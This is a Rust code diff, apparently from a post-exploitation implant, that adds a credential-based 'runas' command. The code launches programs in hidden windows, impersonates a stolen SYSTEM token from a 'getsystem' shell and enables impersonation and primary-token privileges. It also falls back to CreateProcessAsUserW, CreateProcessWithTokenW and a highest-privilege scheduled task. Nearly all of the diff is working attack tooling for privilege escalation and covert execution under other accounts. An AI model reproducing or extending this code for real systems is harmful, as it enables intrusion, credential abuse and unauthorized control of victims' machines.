@@ -12,7 +12,51 @@ mod inner {
         SC_MANAGER_ALL_ACCESS, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
         SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
     };
-    use windows_sys::Win32::Foundation::GetLastError;
+    use windows_sys::Win32::Foundation::{CloseHandle, GetLastError};
+    use windows_sys::Win32::Security::{
+        ImpersonateLoggedOnUser, LogonUserW, RevertToSelf,
+        LOGON32_LOGON_BATCH, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,
+        TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY,
+    };
+    use windows_sys::Win32::System::Threading::{
+        GetCurrentProcess, OpenProcessToken, STARTUPINFOW, PROCESS_INFORMATION,
+    };
+
+    #[repr(C)]
+    struct NativeSystemTime {
+        year: u16, month: u16, day_of_week: u16, day: u16,
+        hour: u16, minute: u16, second: u16, milliseconds: u16,
+    }
+
+    #[link(name = "advapi32")]
+    extern "system" {
+        fn CreateProcessWithLogonW(
+            username: *const u16, domain: *const u16, password: *const u16,
+            logon_flags: u32, application: *const u16, command: *mut u16,
+            creation_flags: u32, environment: *const core::ffi::c_void,
+            current_dir: *const u16, startup: *const STARTUPINFOW,
+            process_info: *mut PROCESS_INFORMATION,
+        ) -> i32;
+        fn CreateProcessAsUserW(
+            token: isize, application: *const u16, command: *mut u16,
+            process_attrs: *const core::ffi::c_void,
+            thread_attrs: *const core::ffi::c_void,
+            inherit_handles: i32, creation_flags: u32,
+            environment: *const core::ffi::c_void, current_dir: *const u16,
+            startup: *const STARTUPINFOW, process_info: *mut PROCESS_INFORMATION,
+        ) -> i32;
+        fn CreateProcessWithTokenW(
+            token: isize, logon_flags: u32, application: *const u16,
+            command: *mut u16, creation_flags: u32,
+            environment: *const core::ffi::c_void, current_dir: *const u16,
+            startup: *const STARTUPINFOW, process_info: *mut PROCESS_INFORMATION,
+        ) -> i32;
+    }
+
+    #[link(name = "kernel32")]
+    extern "system" {
+        fn GetLocalTime(system_time: *mut NativeSystemTime);
+    }
 
     fn to_wide(s: &str) -> Vec<u16> {
         OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
@@ -208,14 +252,138 @@ mod inner {
         ))
     }
 
+    unsafe fn spawn_as_user_direct(path: &str, account: &str, password: &str)
+        -> Result<(u32, String), String>
+    {
+        // Credential-backed RunAs. The primary child is created immediately;
+        // token APIs are compatibility fallbacks for machines where Secondary
+        // Logon or local policy blocks CreateProcessWithLogonW.
+        let (domain, username) = if let Some(i) = account.find('\\') {
+            (account[..i].to_string(), account[i + 1..].to_string())
+        } else if let Some(i) = account.find('@') {
+            (account[i + 1..].to_string(), account[..i].to_string())
+        } else {
+            (".".to_string(), account.to_string())
+        };
+        if username.is_empty() || password.is_empty() {
+            return Err("invalid username or password".to_string());
+        }
+
+        let wuser = to_wide(&username);
+        let wdomain = to_wide(&domain);
+        let wpass = to_wide(password);
+        let wpath = to_wide(path);
+        let wcwd = to_wide(r"C:\Windows\System32");
+        let mut wcmd = to_wide(&format!(r#""{}""#, path));
+        let mut si: STARTUPINFOW = std::mem::zeroed();
+        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+        si.dwFlags = 0x0000_0001; // STARTF_USESHOWWINDOW
+        si.wShowWindow = 0; // SW_HIDE
+        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
+
+        let logon_ok = CreateProcessWithLogonW(
+            wuser.as_ptr(), wdomain.as_ptr(), wpass.as_ptr(), 0,
+            wpath.as_ptr(), wcmd.as_mut_ptr(), 0x0800_0000,
+            std::ptr::null(), wcwd.as_ptr(), &si, &mut pi,
+        );
+        let logon_err = if logon_ok == 0 { GetLastError() } else { 0 };
+        if logon_ok != 0 {
+            let pid = pi.dwProcessId;
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            return Ok((pid, "CreateProcessWithLogonW".to_string()));
+        }
+
+        // Ensure the fallback is executed with the same SYSTEM context that
+        // backs the post-getsystem shell when one is available.
+        let system_token = crate::commands::system_token_handle();
+        let mut impersonated = false;
+        if system_token != 0 && ImpersonateLoggedOnUser(system_token) != 0 {
+            impersonated = true;
+            crate::commands::enable_priv_token(system_token, "SeImpersonatePrivilege");
+            crate::commands::enable_priv_token(system_token, "SeIncreaseQuotaPrivilege");
+            crate::commands::enable_priv_token(system_token, "SeAssignPrimaryTokenPrivilege");
+        }
+        let mut self_token = 0isize;
+        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+            &mut self_token) != 0 {
+            crate::commands::enable_priv(self_token, "SeImpersonatePrivilege");
+            crate::commands::enable_priv(self_token, "SeIncreaseQuotaPrivilege");
+            crate::commands::enable_priv(self_token, "SeAssignPrimaryTokenPrivilege");
+            CloseHandle(self_token);
+        }
+
+        let domain_ptr = wdomain.as_ptr();
+        let mut user_token = 0isize;
+        let mut logged = LogonUserW(
+            wuser.as_ptr(), domain_ptr, wpass.as_ptr(),
+            LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &mut user_token,
+        );
+        let mut batch_err = 0;
+        let mut interactive_err = 0;
+        if logged == 0 {
+            batch_err = GetLastError();
+            logged = LogonUserW(
+                wuser.as_ptr(), domain_ptr, wpass.as_ptr(),
+                LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &mut user_token,
+            );
+            if logged == 0 { interactive_err = GetLastError(); }
+        }
+
+        let mut created = 0;
+        let mut method = String::new();
+        let mut as_user_err = 0;
+        let mut with_token_err = 0;
+        if logged != 0 {
+            let mut cmd_as_user = to_wide(&format!(r#""{}""#, path));
+            created = CreateProcessAsUserW(
+                user_token, wpath.as_ptr(), cmd_as_user.as_mut_ptr(),
+                std::ptr::null(), std::ptr::null(), 0, 0x0800_0000,
+                std::ptr::null(), wcwd.as_ptr(), &si, &mut pi,
+            );
+            if created != 0 {
+                method = "CreateProcessAsUserW".to_string();
+            } else {
+                as_user_err = GetLastError();
+            }
+            if created == 0 {
+                let mut cmd_with_token = to_wide(&format!(r#""{}""#, path));
+                created = CreateProcessWithTokenW(
+                    user_token, 0, wpath.as_ptr(), cmd_with_token.as_mut_ptr(),
+                    0x0800_0000, std::ptr::null(), wcwd.as_ptr(), &si, &mut pi,
+                );
+                if created != 0 {
+                    method = "CreateProcessWithTokenW".to_string();
+                } else {
+                    with_token_err = GetLastError();
+                }
+            }
+        }
+
+        if created != 0 {
+            let pid = pi.dwProcessId;
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            CloseHandle(user_token);
+            if impersonated { RevertToSelf(); }
+            return Ok((pid, method));
+        }
+
+        if user_token != 0 { CloseHandle(user_token); }
+        if impersonated { RevertToSelf(); }
+        Err(format!(
+            "CreateProcessWithLogonW={} batch={} interactive={} AsUser={} WithToken={}",
+            logon_err, batch_err, interactive_err, as_user_err, with_token_err,
+        ))
+    }
+
     fn current_time_plus_minutes(add_minutes: u64) -> String {
-        // Get UTC seconds since epoch, compute HH:MM offset by add_minutes
-        use std::time::{SystemTime, UNIX_EPOCH};
-        let secs = SystemTime::now()
-            .duration_since(UNIX_EPOCH)
-            .unwrap_or_default()
-            .as_secs();
-        let total_mins = (secs / 60 + add_minutes) % (24 * 60);
+        let mut st = NativeSystemTime {
+            year: 0, month: 0, day_of_week: 0, day: 0,
+            hour: 0, minute: 0, second: 0, milliseconds: 0,
+        };
+        unsafe { GetLocalTime(&mut st); }
+        let total_mins = (st.hour as u64 * 60 + st.minute as u64 + add_minutes) % (24 * 60);
         format!("{:02}:{:02}", total_mins / 60, total_mins % 60)
     }
 
@@ -243,7 +411,7 @@ mod inner {
         };
         // Task name without leading \ to avoid syntax errors on older Windows builds.
         let task_name = svc_name.clone();
-        // Schedule for current UTC time + 2 minutes so the task is not in the past.
+        // Schedule for current local time + 2 minutes so the task is not in the past.
         let st = current_time_plus_minutes(2);
         sch(&format!(
             "/Create /TN \"{}\" /TR \"{}\" /SC ONCE /ST {} /RU SYSTEM /F",
@@ -328,6 +496,16 @@ mod inner {
             }
         };
 
+        let direct_err = match unsafe { spawn_as_user_direct(effective_path, user, pass) } {
+            Ok((pid, method)) => {
+                return Ok(format!(
+                    "[+] runas → {}\n    path: {}\n    pid: {}\n    method: {}",
+                    user, effective_path, pid, method
+                ));
+            }
+            Err(err) => err,
+        };
+
         // Strip leading ".\" from user for schtasks /RU (schtasks rejects "." as domain).
         let ru_account = if let Some(idx) = user.find('\\') {
             let domain = &user[..idx];
@@ -341,13 +519,14 @@ mod inner {
 
         // schtasks /RU+/RP creates a batch-logon session (type 4) — unlike PSRemoting
         // (type 3), the child process can authenticate outbound to named pipes.
+        let start_at = current_time_plus_minutes(2);
         let create_out = Command::new("schtasks")
             .args([
                 "/create",
                 "/RU", &ru_account, "/RP", pass,
                 "/TR", effective_path,
                 "/TN", &task_name,
-                "/SC", "ONCE", "/ST", "00:00", "/RL", "HIGHEST",
+                "/SC", "ONCE", "/ST", &start_at, "/RL", "HIGHEST",
                 "/F",
             ])
             .output()
@@ -355,7 +534,8 @@ mod inner {
 
         if !create_out.status.success() {
             return Err(format!(
-                "runas: schtasks /create failed: {}{}",
+                "runas: direct launch failed: {}\nrunas: schtasks /create failed: {}{}",
+                direct_err,
                 String::from_utf8_lossy(&create_out.stdout),
                 String::from_utf8_lossy(&create_out.stderr),
             ));
@@ -370,7 +550,8 @@ mod inner {
                 .args(["/delete", "/TN", &task_name, "/F"])
                 .output();
             return Err(format!(
-                "runas: schtasks /run failed: {}{}",
+                "runas: direct launch failed: {}\nrunas: schtasks /run failed: {}{}",
+                direct_err,
                 String::from_utf8_lossy(&run_out.stdout),
                 String::from_utf8_lossy(&run_out.stderr),
             ));
@@ -385,8 +566,8 @@ mod inner {
         });
 
         Ok(format!(
-            "[+] runas → {} (schtasks)\n    path: {}\n",
-            user, effective_path
+            "[+] runas → {} (schtasks fallback /ST {})\n    path: {}\n    direct launch failed: {}\n",
+            user, start_at, effective_path, direct_err
         ))
     }
 
